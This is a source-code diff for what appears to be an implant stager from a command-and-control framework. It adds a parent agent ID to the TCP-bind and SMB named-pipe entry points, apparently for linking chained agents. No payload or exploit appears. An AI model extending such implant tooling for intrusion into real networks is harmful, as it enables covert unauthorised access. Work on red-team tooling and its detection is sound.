@@ -6,6 +6,7 @@ using System.Net;
 public class AgentStage
 {
     static string AgentID;
+    static string ParentAgentID;
 
     public static void HttpEntryPoint(string agentID, DateTime killDate, string connectHost, int connectPort, int sleepInterval, int sleepJitter)
     {
@@ -21,9 +22,10 @@ public class AgentStage
         StartAgent(config, commModule);
     }
 
-    public static void TcpEntryPoint(string agentID, DateTime killDate, string bindAddress, int bindPort)
+    public static void TcpEntryPoint(string agentID, string parentAgentID, DateTime killDate, string bindAddress, int bindPort)
     {
         AgentID = agentID;
+        ParentAgentID = parentAgentID;
 
         var config = new ConfigController();
         config.SetOption(ConfigSetting.KillDate, killDate);
@@ -33,9 +35,10 @@ public class AgentStage
         StartAgent(config, commModule);
     }
 
-    public static void SmbEntryPoint(string agentID, DateTime killDate, string pipeName)
+    public static void SmbEntryPoint(string agentID, string parentAgentID, DateTime killDate, string pipeName)
     {
         AgentID = agentID;
+        ParentAgentID = parentAgentID;
 
         var config = new ConfigController();
         config.SetOption(ConfigSetting.KillDate, killDate);
@@ -52,7 +55,7 @@ public class AgentStage
         commModule.Init(config, crypto);
 
         var agent = new AgentController(config, crypto, commModule);
-        agent.Init(AgentID);
+        agent.Init(AgentID, ParentAgentID);
         
         agent.RegisterAgentModule(new CoreModule());
         agent.RegisterAgentModule(new SetModule());
